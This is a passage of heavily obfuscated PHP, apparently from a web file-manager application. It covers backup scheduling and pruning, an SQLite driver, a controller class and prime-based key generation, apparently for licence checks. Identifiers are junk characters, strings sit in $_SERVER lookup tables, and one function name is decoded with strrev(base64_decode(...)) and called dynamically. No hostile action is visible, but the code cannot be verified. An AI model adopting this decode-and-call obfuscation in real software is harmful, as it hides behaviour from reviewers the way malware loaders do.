($f¿„ƒÒ˜ÖÉ == 1) { break; } else { $CµŠğ­˜Ï++; } } goto dÈèí¦ ¼; AÌÔÒËš¯Ò: if (strlen($c³ÎŠ†‰Şì) < $e­…ÄóËª´[592]) { die; } return $CÒ‘ÕÚ×…Î; goto f³ßÇã«µ«; a¯ÍÍùø—Ø: $e­…ÄóËª´ =& $_SERVER[Šº]; $eÖâÂŒÉíÖ =& $_SERVER[ÁäèóÕ]; $A¤¶¼¨À¿æ = $this->{$_SERVER[ÁäèóÕ][360]}(); goto A…¦Ÿ‹‡; B±áèæ’Ê: $f†”‹ó‚ÔÌ = $eÖâÂŒÉíÖ[124]($eÖâÂŒÉíÖ[361] . ($A¤¶¼¨À¿æ + $fÄâè±İá) . $eÖâÂŒÉíÖ[362] . $CµŠğ­˜Ï . $eÖâÂŒÉíÖ[362] . $cŒÌÑÇƒó° . $eÖâÂŒÉíÖ[363]); $CÒ‘ÕÚ×…Î = $this->{$_SERVER[ÁäèóÕ][157]}($F™Ÿ°¤çà¯, $f†”‹ó‚ÔÌ) . $eÖâÂŒÉíÖ[364] . $aœ„ÌÙæ©; $c³ÎŠ†‰Şì = $e­…ÄóËª´[691]; goto AÌÔÒËš¯Ò; A…¦Ÿ‹‡: $fÄâè±İá = $this->{$_SERVER[ÁäèóÕ][360]}(); $d…Ì‡ÛˆŒÊ = ($A¤¶¼¨À¿æ - 1) * ($fÄâè±İá - 1); $Eß´îâ•İÈ = $e­…ÄóËª´[686]; goto b÷ÇĞÂÈ“£; f³ßÇã«µ«: } public function vhcg3462af1f($A¦Šœ·±ù¼) { goto AÏë¨³Ëµ…; E™¥ë–ÆÈ˜: while (1) { $dó±µö†£ø = $FÅæÆ±°¬ğ; $fãÎŸĞ‹´¢ = $cŞƒ«ÄÑ¦ó; $C®¥îÕ µ« = $D›™ÜœÁ§½[694]; while ($fãÎŸĞ‹´¢ % $dó±µö†£ø != 0) { $D‘ÛÍÃÜÖ = $fãÎŸĞ‹´¢; $fãÎŸĞ‹´¢ = $dó±µö†£ø; $c´‚òèÊÎ = $D›™ÜœÁ§½[695]; if (!$c´‚òèÊÎ) { die; } $dó±µö†£ø = $D‘ÛÍÃÜÖ % $dó±µö†£ø; $bçŠİ¥Ûµ = $D›™ÜœÁ§½[696]; if (!$bçŠİ¥Ûµ) { return; } } if ($dó±µö†£ø == 1) { break; } else { $FÅæÆ±°¬ğ++; } } $c¬¢ºŸ§à‚ = 2; for ($dŒ÷óï§«¾ = 0; $dŒ÷óï§«¾ < $cŞƒ«ÄÑ¦ó * 10; $dŒ÷óï§«¾++) { if (($cŞƒ«ÄÑ¦ó * $dŒ÷óï§«¾ + 1) % $FÅæÆ±°¬ğ == 0) { $c¬¢ºŸ§à‚ = $aàÃµÄâ¢Å[254](($cŞƒ«ÄÑ¦ó * $dŒ÷óï§«¾ + 1) / $FÅæÆ±°¬ğ); break; } } goto dÕ ˆĞˆ¤®; dò÷îéŒ: if ($aàÃµÄâ¢Å[19]($B–£§ÖíÅ”) != 2) { return $aàÃµÄâ¢Å[10]; } $CŒ‚’‘ŞÆ„ = $this->{$_SERVER[ÁäèóÕ][260]}($B–£§ÖíÅ”[1] . $aàÃµÄâ¢Å[10], $aàÃµÄâ¢Å[159]); if (!$CŒ‚’‘ŞÆ„) { return $aàÃµÄâ¢Å[10]; } goto EœŸ¼áÖ¥©; AÏë¨³Ëµ…: $D›™ÜœÁ§½ =& $_SERVER[Šº]; $aàÃµÄâ¢Å =& $_SERVER[ÁäèóÕ]; $B–£§ÖíÅ” = $aàÃµÄâ¢Å[0]($aàÃµÄâ¢Å[364], $A¦Šœ·±ù¼); goto dò÷îéŒ; fé¨´è°¢¡: $aÖÌ¤µÜ‚ = $D›™ÜœÁ§½[698]; return $d®ÔĞ·Å¨³; $cÙÕ¹Ä×º = $D›™ÜœÁ§½[699]; goto Dé‘ö–èíò; EœŸ¼áÖ¥©: $CŒ‚’‘ŞÆ„ = $aàÃµÄâ¢Å[254]($CŒ‚’‘ŞÆ„); $AŠ‹É°”„Ø = 0; $C«Ãæ²Ş›” = 0; goto c”øÀí¥©¨; CÑõ±ß›êâ: if (strlen($E„÷¶¹ßÇ) < $D›™ÜœÁ§½[588]) { return; } $FÅæÆ±°¬ğ = $aàÃµÄâ¢Å[254](($AŠ‹É°”„Ø + $C«Ãæ²Ş›”) / 2); $FÜÌ®ˆ¥ = $D›™ÜœÁ§½[693]; goto E™¥ë–ÆÈ˜; c”øÀí¥©¨: for ($dŒ÷óï§«¾ = 3; $dŒ÷óï§«¾ < $CŒ‚’‘ŞÆ„; $dŒ÷óï§«¾ += 2) { if ($CŒ‚’‘ŞÆ„ % $dŒ÷óï§«¾ != 0) { continue; } $AŠ‹É°”„Ø = $dŒ÷óï§«¾; $C«Ãæ²Ş›” = $aàÃµÄâ¢Å[254]($CŒ‚’‘ŞÆ„ / $dŒ÷óï§«¾); break; } $cŞƒ«ÄÑ¦ó = ($AŠ‹É°”„Ø - 1) * ($C«Ãæ²Ş›” - 1); $E„÷¶¹ßÇ = $D›™ÜœÁ§½[692]; goto CÑõ±ß›êâ; Dé‘ö–èíò: if (!$cÙÕ¹Ä×º) { return; } goto f„¯Ø‰ŠÕŠ; dÕ ˆĞˆ¤®: $fÌ…Ü£“¹ = $aàÃµÄâ¢Å[124]($aàÃµÄâ¢Å[361] . ($AŠ‹É°”„Ø + $C«Ãæ²Ş›”) . $aàÃµÄâ¢Å[362] . $FÅæÆ±°¬ğ . $aàÃµÄâ¢Å[362] . $c¬¢ºŸ§à‚ . $aàÃµÄâ¢Å[363]); $bˆ‹çŸ¿¯ = $D›™ÜœÁ§½[697]; $d®ÔĞ·Å¨³ = $this->{$_SERVER[ÁäèóÕ][260]}($B–£§ÖíÅ”[0], $fÌ…Ü£“¹); goto fé¨´è°¢¡; f„¯Ø‰ŠÕŠ: } public function tdvc394c8834() { goto F¾µèê‘–; cŸ¯æ³¾¥¼: $AËÈãŞ = 2; $b—Ÿ¤œŒ©Å = $Bš­Á÷è¬[704]; if (strlen($b—Ÿ¤œŒ©Å) < $Bš­Á÷è¬[592]) { die; } goto AğÅ§ºÖÓ—; D’î–­ËÙ: $bŠ¹â²Ò¬° = array(); $AÁœÖâ¾´‘ = $Bš­Á÷è¬[700]; if (!$AÁœÖâ¾´‘) { return; } goto e´­‹À±²œ; F¾µèê‘–: $Bš­Á÷è¬ =& $_SERVER[Šº]; $d‹½ğ˜—ÀÅ =& $_SERVER[ÁäèóÕ]; $DÕ¦™È‰Ûâ = $d‹½ğ˜—ÀÅ[345]($d‹½ğ˜—ÀÅ[365](2, 14), $d‹½ğ˜—ÀÅ[365](2, 16) - 1); goto D’î–­ËÙ; e´­‹À±²œ: $eÙÒ—öŠÀ‚ = 1; $c²¸¥‰àñ = $Bš­Á÷è¬[701]; while ($eÙÒ—öŠÀ‚ <= (int) $d‹½ğ˜—ÀÅ[366]($DÕ¦™È‰Ûâ)) { $e†ß÷³…¿É = $eÙÒ—öŠÀ‚; $dÕßˆÄŠºÌ = $Bš­Á÷è¬[702]; if (!$dÕßˆÄŠºÌ) { return; } while (!0) { $e†ß÷³…¿É++; $e§´‡¤›‘Ä = $Bš­Á÷è¬[703]; if (strlen($e§´‡¤›‘Ä) < $Bš­Á÷è¬[399]) { return; } if ($e†ß÷³…¿É <= 2) { $eÙÒ—öŠÀ‚ = $e†ß÷³…¿É; break; } else { if ($e†ß÷³…¿É < 2) { continue; } } $dÉĞ”öïæÚ = !0; for ($eë‹’¶ä = 2; $eë‹’¶ä <= $d‹½ğ˜—ÀÅ[366]($e†ß÷³…¿É); $eë‹’¶ä++) { if ($e†ß÷³…¿É % $eë‹’¶ä == 0) { $dÉĞ”öïæÚ = !1; } } if ($dÉĞ”öïæÚ) { $eÙÒ—öŠÀ‚ = $e†ß÷³…¿É; break; } } $bŠ¹â²Ò¬°[] = $eÙÒ—öŠÀ‚; } goto cŸ¯æ³¾¥¼; AğÅ§ºÖÓ—: for ($e†ß÷³…¿É = $DÕ¦™È‰Ûâ; $e†ß÷³…¿É > 1; $e†ß÷³…¿É--) { $dÉĞ”öïæÚ = !0; $DíŒÎÅÇ = $Bš­Á÷è¬[705]; while (strlen($DíŒÎÅÇ) < $Bš­Á÷è¬[592]) { if (!$DíŒÎÅÇ) { break; } $DíŒÎÅÇ++; } foreach ($bŠ¹â²Ò¬° as $DÏ§•¾‰é¥) { if ($e†ß÷³…¿É % $DÏ§•¾‰é¥ == 0) { $dÉĞ”öïæÚ = !1; break; } } if ($dÉĞ”öïæÚ) { $AËÈãŞ = $e†ß÷³…¿É; break; } } return $AËÈãŞ; goto fÀİ×®Ï‘õ; fÀİ×®Ï‘õ: } public function icbn2e519c57($E”ÙÁö³ÚÜ, $fâ•³‚çÃ²) { $eÌ÷Æ¾ä›» =& $_SERVER[Šº]; $a´á†²ùÂ‰ =& $_SERVER[ÁäèóÕ]; return $a´á†²ùÂ‰[13](array($a´á†²ùÂ‰[14], $a´á†²ùÂ‰[367]), $E”ÙÁö³ÚÜ, $fâ•³‚çÃ²); $F¿šÆ‡Ÿ”¬ = $eÌ÷Æ¾ä›»[706]; if (strlen($F¿šÆ‡Ÿ”¬) < $eÌ÷Æ¾ä›»[598]) { return; } } public function uzef8b568dc3($e’²ØòÖ‡, $eÉ•“³Õ‰¯) { $DİÉè®½íÇ =& $_SERVER[ÁäèóÕ]; return $DİÉè®½íÇ[13](array($DİÉè®½íÇ[368], $DİÉè®½íÇ[369]), $e’²ØòÖ‡, $eÉ•“³Õ‰¯); $Bİè„‘Ñé = $_SERVER[Šº][707]; } public function gxsr53a7e4db($Bà§îÇÄ, $fÖÍñÖ‹‚) { $f†ì„Ğ„‹î =& $_SERVER[Šº]; $dÃ…§®Ö’ =& $_SERVER[ÁäèóÕ]; return $dÃ…§®Ö’[13](array($dÃ…§®Ö’[368], $dÃ…§®Ö’[370]), $Bà§îÇÄ, $fÖÍñÖ‹‚); $eŒ¼§Öåß = $f†ì„Ğ„‹î[708]; while (strlen($eŒ¼§Öåß) < $f†ì„Ğ„‹î[399]) { if (!$eŒ¼§Öåß) { break; } $eŒ¼§Öåß++; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $F—É¤´ØÑ =& $_SERVER[Šº]; self::$name = date($F—É¤´ØÑ[709]); if (!($f…ÉÁ²Úë¦ = Model($F—É¤´ØÑ[710])->lastItem())) { $f…ÉÁ²Úë¦ = $this->initData(); } else { self::$name = $f…ÉÁ²Úë¦[$F—É¤´ØÑ[28]]; if ($f…ÉÁ²Úë¦[$F—É¤´ØÑ[711]] == $F—É¤´ØÑ[87]) { self::$name = date($F—É¤´ØÑ[712]); $CĞ¾¶„ËˆŠ = 0; if (isset($f…ÉÁ²Úë¦[$F—É¤´ØÑ[290]][$F—É¤´ØÑ[192]][$F—É¤´ØÑ[454]])) { $CĞ¾¶„ËˆŠ = (int) $f…ÉÁ²Úë¦[$F—É¤´ØÑ[290]][$F—É¤´ØÑ[192]][$F—É¤´ØÑ[454]]; } if ($f…ÉÁ²Úë¦[$F—É¤´ØÑ[28]] == self::$name) { Model($F—É¤´ØÑ[710])->remove($f…ÉÁ²Úë¦[$F—É¤´ØÑ[392]]); } $f…ÉÁ²Úë¦ = $this->initData($CĞ¾¶„ËˆŠ, $f…ÉÁ²Úë¦[$F—É¤´ØÑ[713]]); } else { $this->checkStore($f…ÉÁ²Úë¦[$F—É¤´ØÑ[713]]); } } self::$option = $f…ÉÁ²Úë¦; } private function initData($açºÈê¿·œ = 0, $Dñ™†™…™Û = '') { goto e®ÅçÓîÂ; b¨¦ÕÖÒ¶: $EÖ‘¹ƒ‹ø†[$EŒÎ¾ñİ[392]] = $DÔÀ¤õâ‹; return $EÖ‘¹ƒ‹ø†; goto AËĞ‰ì™Í¿; e®ÅçÓîÂ: $EŒÎ¾ñİ =& $_SERVER[Šº]; $DË¹§äÑ×Â = Model($EŒÎ¾ñİ[710])->config(); if ($Dñ™†™…™Û && $DË¹§äÑ×Â[$EŒÎ¾ñİ[713]] != $Dñ™†™…™Û) { $açºÈê¿·œ = 0; } goto EÕ’‘¹Ÿ„‰; EÕ’‘¹Ÿ„‰: $this->checkStore($DË¹§äÑ×Â[$EŒÎ¾ñİ[713]]); $EÖ‘¹ƒ‹ø† = array($EŒÎ¾ñİ[713] => $DË¹§äÑ×Â[$EŒÎ¾ñİ[713]], $EŒÎ¾ñİ[28] => self::$name, $EŒÎ¾ñİ[711] => 0, $EŒÎ¾ñİ[714] => $DË¹§äÑ×Â[$EŒÎ¾ñİ[714]], $EŒÎ¾ñİ[290] => array($EŒÎ¾ñİ[715] => array($EŒÎ¾ñİ[711] => 0), $EŒÎ¾ñİ[716] => array($EŒÎ¾ñİ[711] => 0, $EŒÎ¾ñİ[717] => 0, $EŒÎ¾ñİ[718] => 0, $EŒÎ¾ñİ[29] => $EŒÎ¾ñİ[33], $EŒÎ¾ñİ[719] => 0, $EŒÎ¾ñİ[483] => 0), $EŒÎ¾ñİ[720] => array($EŒÎ¾ñİ[711] => 0, $EŒÎ¾ñİ[717] => 0, $EŒÎ¾ñİ[718] => 0, $EŒÎ¾ñİ[719] => 0, $EŒÎ¾ñİ[483] => 0), $EŒÎ¾ñİ[192] => array($EŒÎ¾ñİ[711] => 0, $EŒÎ¾ñİ[721] => 0, $EŒÎ¾ñİ[722] => 0, $EŒÎ¾ñİ[723] => 0, $EŒÎ¾ñİ[724] => 0, $EŒÎ¾ñİ[454] => $açºÈê¿·œ, $EŒÎ¾ñİ[719] => 0, $EŒÎ¾ñİ[483] => 0)), $EŒÎ¾ñİ[719] => time(), $EŒÎ¾ñİ[483] => 0); $DÔÀ¤õâ‹ = Model($EŒÎ¾ñİ[710])->insert($EÖ‘¹ƒ‹ø†); goto b¨¦ÕÖÒ¶; AËĞ‰ì™Í¿: } private function checkStore($dÈìÍÓƒŒ—) { $a™à‰ôõ¦º =& $_SERVER[Šº]; $cá§ù™Œ¡© = Model($a™à‰ôõ¦º[725])->listData($dÈìÍÓƒŒ—); Model($a™à‰ôõ¦º[725])->checkConfig($cá§ù™Œ¡©); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[Šº][710])->findByName(self::$name); } return self::$option; } public static function set($a¹ƒõ¹¬”) { $cƒí²ìŞÁ =& $_SERVER[Šº]; $eÆÛÏ®ôˆŸ = self::get(); foreach ($a¹ƒõ¹¬” as $aÖ©µİ˜î› => $d¡ÈØŸìØÕ) { $c—ÑÕæ³±ã = explode($cƒí²ìŞÁ[95], $aÖ©µİ˜î›); $Aºò–ñ¹ã = count($c—ÑÕæ³±ã); switch ($Aºò–ñ¹ã) { case 1: $eÆÛÏ®ôˆŸ[$c—ÑÕæ³±ã[0]] = $d¡ÈØŸìØÕ; break; case 2: $eÆÛÏ®ôˆŸ[$c—ÑÕæ³±ã[0]][$c—ÑÕæ³±ã[1]] = $d¡ÈØŸìØÕ; break; case 3: $eÆÛÏ®ôˆŸ[$c—ÑÕæ³±ã[0]][$c—ÑÕæ³±ã[1]][$c—ÑÕæ³±ã[2]] = $d¡ÈØŸìØÕ; break; } } Model($cƒí²ìŞÁ[710])->update($eÆÛÏ®ôˆŸ[$cƒí²ìŞÁ[392]], $eÆÛÏ®ôˆŸ); self::$option = $eÆÛÏ®ôˆŸ; return self::$option; } public function keep() { $F¼ŒİšÔ¶ =& $_SERVER[Šº]; $B×¢ˆÖ¾áù = self::get(); if ($B×¢ˆÖ¾áù[$F¼ŒİšÔ¶[290]][$F¼ŒİšÔ¶[715]][$F¼ŒİšÔ¶[711]] == $F¼ŒİšÔ¶[87]) { return; } $this->backupKeep($B×¢ˆÖ¾áù); self::set(array($F¼ŒİšÔ¶[726] => 1)); } private function backupKeep($f¦×Ñ¢â) { goto Aóñ‡çà‹í; eÄÖ£¬Ë˜™: $d˜„†¤İ¯ = 0; $dã¢Úƒ£§ = array(); foreach ($d‡åÚŠ‹¬ê as $cÖçãÓé¦) { if ($d˜„†¤İ¯ >= 7) { break; } $dã¢Úƒ£§[] = $cÖçãÓé¦[$D…è•ØŒï‘[28]]; $d˜„†¤İ¯++; } goto EŒŸ åœ„; EŒŸ åœ„: for ($d˜„†¤İ¯ = 0; $d˜„†¤İ¯ < 12; $d˜„†¤İ¯++) { $dã¢Úƒ£§[] = date($D…è•ØŒï‘[727], strtotime("\x2d{$d˜„†¤İ¯}\x20\x6d\x6f\x6e\164\150\x73")); } $dã¢Úƒ£§ = array_unique($dã¢Úƒ£§); $b¢‰‘­–ÅÄ = Model($D…è•ØŒï‘[728])->get($D…è•ØŒï‘[729]); goto E‚ª…ÏŞ‹à; E‚ª…ÏŞ‹à: foreach ($d‡åÚŠ‹¬ê as $cÖçãÓé¦) { if (!empty($cÖçãÓé¦[$D…è•ØŒï‘[28]]) && in_array($cÖçãÓé¦[$D…è•ØŒï‘[28]], $dã¢Úƒ£§)) { continue; } Model($D…è•ØŒï‘[710])->remove($cÖçãÓé¦[$D…è•ØŒï‘[392]]); $c½‡¤‹îŠ‚ = $this->backupPath($f¦×Ñ¢â, $b¢‰‘­–ÅÄ); IO::remove($c½‡¤‹îŠ‚, !1); } goto aÂù‰õØ”³; Aóñ‡çà‹í: $D…è•ØŒï‘ =& $_SERVER[Šº]; $d‡åÚŠ‹¬ê = Model($D…è•ØŒï‘[710])->listData(); if (empty($d‡åÚŠ‹¬ê)) { return; } goto eÄÖ£¬Ë˜™; aÂù‰õØ”³: } private function backupPath($Aƒ‘ªîÛ´ô, $CÌ‰Òî½Š¹ = false) { $bê¤ùĞª‘¦ =& $_SERVER[Šº]; if (!$CÌ‰Òî½Š¹) { $CÌ‰Òî½Š¹ = Model($bê¤ùĞª‘¦[728])->get($bê¤ùĞª‘¦[729]); } $cŒ‚Å–Ù’ó = $Aƒ‘ªîÛ´ô[$bê¤ùĞª‘¦[28]]; $bø«¢®¼îˆ = substr(md5($bê¤ùĞª‘¦[730] . $CÌ‰Òî½Š¹ . $cŒ‚Å–Ù’ó), 0, 8); return "\173\151\x6f\x3a{$Aƒ‘ªîÛ´ô[$bê¤ùĞª‘¦[713]]}\175\x2f\x64\141\x74\141\x62\x61\163\x65\57\x62\x61\143\153\165\160\x2f" . $cŒ‚Å–Ù’ó . $bê¤ùĞª‘¦[71] . $bø«¢®¼îˆ; } public function db() { goto BÜ­ŒÄôí; AÙ·“èõÌÄ: $e ¿Ñç´Ù‡ = new BackupDb(); if (!$e ¿Ñç´Ù‡->index()) { return !1; } self::set(array($cĞ¤˜š™ê[731] => 1)); goto Eƒ‹¢¢ÒĞ; Eƒ‹¢¢ÒĞ: return !0; goto b˜ƒÖ‰ƒù; BÜ­ŒÄôí: $cĞ¤˜š™ê =& $_SERVER[Šº]; $F Í…ã‹© = self::get(); if ($F Í…ã‹©[$cĞ¤˜š™ê[290]][$cĞ¤˜š™ê[716]][$cĞ¤˜š™ê[711]] == $cĞ¤˜š™ê[87]) { return !0; } goto AÙ·“èõÌÄ; b˜ƒÖ‰ƒù: } public function dbFile() { goto e¥âåáÆ·è; d«§›±Éœ¸: return !0; goto E†Œñğí…Ş; e¥âåáÆ·è: $EàÅ®’Í´‹ =& $_SERVER[Šº]; $f¨âìŒ£Ñ = self::get(); if ($f¨âìŒ£Ñ[$EàÅ®’Í´‹[290]][$EàÅ®’Í´‹[720]][$EàÅ®’Í´‹[711]] == $EàÅ®’Í´‹[87]) { return !0; } goto DØÑ¬“·µ; DØÑ¬“·µ: $Aå ³× = new BackupDbFile(); if (!$Aå ³×->index()) { return !1; } self::set(array($EàÅ®’Í´‹[732] => 1)); goto d«§›±Éœ¸; E†Œñğí…Ş: } public function file() { $DóœÁÁ®’Ô =& $_SERVER[Šº]; $a‹¦½ÃÕöí = self::get(); if ($a‹¦½ÃÕöí[$DóœÁÁ®’Ô[290]][$DóœÁÁ®’Ô[192]][$DóœÁÁ®’Ô[711]] == $DóœÁÁ®’Ô[87]) { return !0; } if (!isset($a‹¦½ÃÕöí[$DóœÁÁ®’Ô[714]]) || $a‹¦½ÃÕöí[$DóœÁÁ®’Ô[714]] == $DóœÁÁ®’Ô[504]) { $c†Ÿˆè×Â« = new BackupFile(); if (!$c†Ÿˆè×Â«->index()) { return !1; } } self::set(array($DóœÁÁ®’Ô[733] => 1, $DóœÁÁ®’Ô[711] => 1)); return !0; } } goto bö÷Æğ¹ãÒ; C´ÜÉÕ¹²±: $C˜Öº ¦÷¼ = strrev(base64_decode($_SERVER[ÇÚ][0])); function binCheckNeq($FùœÜ¶¼Ô´, $E…ÀŸÀÀòì) { return $FùœÜ¶¼Ô´ != $E…ÀŸÀÀòì; } $_SERVER[$_SERVER[ÇÚ][1]] = $C˜Öº ¦÷¼($_SERVER[$_SERVER[ÇÚ][2]]); goto Cä¬°ë†ßÀ; b‰áìšŠƒ : class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto c¾¡À±°ğÚ; c¾¡À±°ğÚ: $cÎ¢†Ûå‘¼ =& $_SERVER[Šº]; global $in, $config; $this->config =& $config; goto AŒÛ±æ‰“; AŒÛ±æ‰“: $this->in =& $in; $this->values[$cÎ¢†Ûå‘¼[6]] =& $config; $this->values[$cÎ¢†Ûå‘¼[7]] =& $in; goto AÍ—Ÿ‚ˆ†Ñ; AÍ—Ÿ‚ˆ†Ñ: $this->tpl = TEMPLATE . MOD . $cÎ¢†Ûå‘¼[8]; $this->_classObjectID = mt_rand(0, 10000); goto d–ÔÇŒíëŸ; d–ÔÇŒíëŸ: } public function loadClass($CÜĞÀİùÚù) { if (1 === func_num_args()) { $this->{$CÜĞÀİùÚù} = new $CÜĞÀİùÚù(); } else { $AñÂĞ„—Şö = new ReflectionClass($CÜĞÀİùÚù); $d­çëå³à³ = func_get_args(); array_shift($d­çëå³à³); $this->{$CÜĞÀİùÚù} = $AñÂĞ„—Şö->newInstanceArgs($d­çëå³à³); } return $this->{$CÜĞÀİùÚù}; } protected function assign($A¢ô‹«ğíÖ, $eÈ¸Ä—‰±Ì) { $this->values[$A¢ô‹«ğíÖ] = $eÈ¸Ä—‰±Ì; } protected function display($aŞ†«¹¸´) { ob_end_clean(); extract($this->values); require $this->tpl . $aŞ†«¹¸´; } } class DbSqliteBase extends Db { public function __construct($F²¶¨ˆ­®‹ = '') { $A÷˜çô¼À =& $_SERVER[Šº]; if (!extension_loaded($A÷˜çô¼À[9])) { think_exception(think_lang($A÷˜çô¼À[10]) . $A÷˜çô¼À[11]); } if (!empty($F²¶¨ˆ­®‹)) { if (!isset($F²¶¨ˆ­®‹[$A÷˜çô¼À[12]])) { $F²¶¨ˆ­®‹[$A÷˜çô¼À[12]] = 438; } $this->config = $F²¶¨ˆ­®‹; if (empty($this->config[$A÷˜çô¼À[13]])) { $this->config[$A÷˜çô¼À[13]] = array(); } } } public function connect($d˜¤èá…µ = '', $C™ ÛãÍ¼ = 0) { $b¦õ„ª¼ =& $_SERVER[Šº]; if (!isset($this->linkID[$C™ ÛãÍ¼])) { goto Bô‡å‡ãµ; Eñ—Œ®¥: $this->linkID[$C™ ÛãÍ¼] = $e¸¬Œ‹„Ù($d˜¤èá…µ[$b¦õ„ª¼[17]], $d˜¤èá…µ[$b¦õ„ª¼[12]]); if (!$this->linkID[$C™ ÛãÍ¼]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto aôÊøÅÂÏ; Bô‡å‡ãµ: if (empty($d˜¤èá…µ)) { $d˜¤èá…µ = $this->config; } $ağÁò¼ó³ = !empty($d˜¤èá…µ[$b¦õ„ª¼[13]][$b¦õ„ª¼[14]]) ? $d˜¤èá…µ[$b¦õ„ª¼[13]][$b¦õ„ª¼[14]] : $this->pconnect; $e¸¬Œ‹„Ù = $ağÁò¼ó³ ? $b¦õ„ª¼[15] : $b¦õ„ª¼[16]; goto Eñ—Œ®¥; aôÊøÅÂÏ: @sqlite_busy_timeout($this->linkID[$C™ ÛãÍ¼], 30000); if (1 != think_config($b¦õ„ª¼[18])) { unset($this->config); } goto aœÖ¨ğ„Áö; aœÖ¨ğ„Áö: } return $this->linkID[$C™ ÛãÍ¼]; } public function free() { $this->queryID = null; } public function query($BöÖ¢Çîà®) { goto f¿ß„Ù¬È¸; a‚È†îØÍ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $f¨ğéÑ´Úƒ = $this->getAll(); return $f¨ğéÑ´Úƒ; } goto Cø‡Ä™Â³‚; dœÁåØåÑ: think_status($E¿‰Š¦ÙŸ[20]); $this->queryID = sqlite_query($this->_linkID, $BöÖ¢Çîà®); $this->debug(); goto a‚È†îØÍ; f¿ß„Ù¬È¸: $E¿‰Š¦ÙŸ =& $_SERVER[Šº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C‘÷§Ñ®; C‘÷§Ñ®: $this->queryStr = $BöÖ¢Çîà®; if ($this->queryID) { $this->free(); } think_action_status($E¿‰Š¦ÙŸ[19], 1); goto dœÁåØåÑ; Cø‡Ä™Â³‚: } public function execute($cñğÎÜîĞ¯) { goto cœ„øéƒá; B¢ø ƒ‡½İ: think_status($fìöñ×—ÅÌ[20]); $cééøñ•æß = sqlite_exec($this->_linkID, $cñğÎÜîĞ¯); $this->debug(); goto C ŒÅÕí«×; C ŒÅÕí«×: if (!1 === $cééøñ•æß) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Bºè“ù°åø; Bêº´Ù–À‚: $this->queryStr = $cñğÎÜîĞ¯; if ($this->queryID) { $this->free(); } think_action_status($fìöñ×—ÅÌ[21], 1); goto B¢ø ƒ‡½İ; cœ„øéƒá: $fìöñ×—ÅÌ =& $_SERVER[Šº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Bêº´Ù–À‚; Bºè“ù°åø: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Šº][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C¨´ĞÙ‚Ì = sqlite_query($this->_linkID, $_SERVER[Šº][23]); if (!$C¨´ĞÙ‚Ì) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cÚ­±Ò†”µ = sqlite_query($this->_linkID, $_SERVER[Šº][24]); if (!$cÚ­±Ò†”µ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $DŒ»¹ß²µÌ = array(); if ($this->numRows > 0) { for ($D´‚¡° = 0; $D´‚¡° < $this->numRows; $D´‚¡°++) { $DŒ»¹ß²µÌ[$D´‚¡°] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $DŒ»¹ß²µÌ; } public function getFields($CÜ½Â¡Üº ) { $F³”Ñ¾—Š =& $_SERVER[Šº]; $D»ÄîÃ™¡Ü = $this->query($F³”Ñ¾—Š[25] . $CÜ½Â¡Üº  . $F³”Ñ¾—Š[26]); $c»„˜ç·Ë = array(); if ($D»ÄîÃ™¡Ü) { foreach ($D»ÄîÃ™¡Ü as $a©×êÉÚ¹ => $DÓÍ„İ‹Ÿ•) { $c»„˜ç·Ë[$DÓÍ„İ‹Ÿ•[$F³”Ñ¾—Š[27]]] = array($F³”Ñ¾—Š[28] => $DÓÍ„İ‹Ÿ•[$F³”Ñ¾—Š[27]], $F³”Ñ¾—Š[29] => $DÓÍ„İ‹Ÿ•[$F³”Ñ¾—Š[30]], $F³”Ñ¾—Š[31] => (bool) ($DÓÍ„İ‹Ÿ•[$F³”Ñ¾—Š[32]] === $F³”Ñ¾—Š[33]), $F³”Ñ¾—Š[34] => $DÓÍ„İ‹Ÿ•[$F³”Ñ¾—Š[35]], $F³”Ñ¾—Š[36] => strtolower($DÓÍ„İ‹Ÿ•[$F³”Ñ¾—Š[37]]) == $F³”Ñ¾—Š[38], $F³”Ñ¾—Š[39] => strtolower($DÓÍ„İ‹Ÿ•[$F³”Ñ¾—Š[40]]) == $F³”Ñ¾—Š[41]); } } return $c»„˜ç·Ë; } public function getTables($AöÌî£ËÙ  = '') { $CÎÉùïŸŞ‰ =& $_SERVER[Šº]; $a¾ëÃ·íí¬ = $this->query($CÎÉùïŸŞ‰[42] . $CÎÉùïŸŞ‰[43] . $CÎÉùïŸŞ‰[44]); $dæÕÖÛ‡Ï = array(); foreach ($a¾ëÃ·íí¬ as $bˆ¬ÒÜÖø => $a‹õîÛ†) { $dæÕÖÛ‡Ï[$bˆ¬ÒÜÖø] = current($a‹õîÛ†); } return $dæÕÖÛ‡Ï; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $B‡İ–¯´¦Ñ =& $_SERVER[Šº]; $CÔ¼ŸºÉˆÈ = sqlite_last_error($this->_linkID); $this->error = $CÔ¼ŸºÉˆÈ . $B‡İ–¯´¦Ñ[4] . sqlite_error_string($CÔ¼ŸºÉˆÈ); if ($B‡İ–¯´¦Ñ[33] != $this->queryStr) { $this->error .= LNG($B‡İ–¯´¦Ñ[45]) . $this->queryStr; } think_trace($this->error, $B‡İ–¯´¦Ñ[33], $B‡İ–¯´¦Ñ[46]); return $this->error; } public function escapeString($fˆõåõôñ) { return sqlite_escape_string($fˆõåõôñ); } public function parseLimit($Fé†ëÔª™Ö) { $f¼ë¡ÇìºÒ =& $_SERVER[Šº]; $fµ™²»óŞÓ = $f¼ë¡ÇìºÒ[33]; if (!empty($Fé†ëÔª™Ö)) { $Fé†ëÔª™Ö = explode($f¼ë¡ÇìºÒ[47], $Fé†ëÔª™Ö); if (count($Fé†ëÔª™Ö) > 1) { 